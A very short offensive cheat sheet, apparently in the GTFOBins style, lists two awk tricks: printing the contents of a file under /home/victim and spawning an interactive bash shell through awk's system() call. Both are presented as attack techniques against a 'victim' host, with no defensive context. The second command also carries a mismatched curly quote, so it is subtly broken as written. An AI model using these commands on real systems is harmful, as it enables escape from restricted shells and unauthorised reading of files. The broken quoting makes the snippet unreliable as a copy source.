

## print content text file
```bash
awk '{print $1}' /home/victim/key.txt
```

## Start bash shell with awk
```bash
awk 'BEGIN {system("/bin/bash")}’
```

